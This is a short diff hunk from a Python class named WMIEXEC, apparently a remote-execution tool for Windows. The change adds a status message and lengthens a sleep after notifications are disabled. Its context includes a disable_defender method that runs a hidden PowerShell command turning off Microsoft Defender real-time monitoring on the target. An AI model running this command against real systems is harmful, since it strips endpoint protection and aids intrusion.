@@ -166,7 +166,8 @@ class WMIEXEC:
 
         logging.debug('notifications being disabling using: ' + command)
         self.__win32Process.Create(command, self.__pwd, None)
-        time.sleep(1)
+        print('            [!] Sleeping while notifications are disabled [!] ')
+        time.sleep(4)
 
     def disable_defender(self):
         command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Set-MpPreference -DisableRealtimeMonitoring $true;"'
